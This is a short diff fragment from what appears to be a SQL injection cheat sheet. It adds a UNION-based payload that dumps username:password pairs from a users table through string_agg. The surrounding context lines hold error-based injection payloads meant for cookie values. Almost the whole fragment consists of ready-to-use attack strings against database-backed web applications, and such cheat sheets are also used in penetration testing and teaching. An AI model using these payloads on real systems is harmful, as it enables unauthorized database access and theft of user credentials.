@@ -232,6 +232,8 @@ CONCAT('foo','bar')
 '||(select column1 from [table name here] limit 1)-- - >> Visible error based sqli in cookie value.
 
 '||cast((select column1 from [table name here] LIMIT 1) AS INT)-- >> Visible error based sqli in cookie value.
+
+' union select null, (SELECT string_agg(username || ':' || password, ', ') FROM users)-- - Retrieving multiple values in a single column
 ```
 
 ### Mysql Database info retrieving
